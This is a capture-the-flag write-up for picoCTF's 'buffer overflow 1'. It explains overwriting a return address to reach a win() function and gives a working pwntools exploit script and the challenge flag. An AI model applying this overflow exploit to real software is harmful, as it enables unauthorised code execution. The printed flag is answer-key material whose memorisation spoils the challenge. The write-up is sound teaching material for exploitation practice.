# buffer overflow 1

Control the return address [vuln](./vuln.c).

Author: Sanjay C / Palash Oswal

200 Points

---
## Solution

This is a very straight forward buffer overflow problem where we must control the return address of the function to access a different function in the program. The first thing we can do is run the program through GDB and `break main`. We can then `info functions | grep win` to see the list of functions in the binary and see the `win()` condition is at `0x080491f6`.

We can also see that there is an expected user buffer of fixed length, so that means we can write past that buffer and control the return address. It's as simple as putting those two together, but writing the entire buffer up to the return address, and then putting in the `win()` address in little-endian format.

Here's my code in my [exploit.py](./exploit.py):
```Python
from pwn import *

# Address of win() is 0x080491f6
buffer = (b"A" * 44) + b"\xf6\x91\x04\x08"

io = remote('saturn.picoctf.net', 52595)

io.sendline(buffer)
output = io.recvall()
print(output.decode())

io.close()
```

---
## Flag
```
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}
```
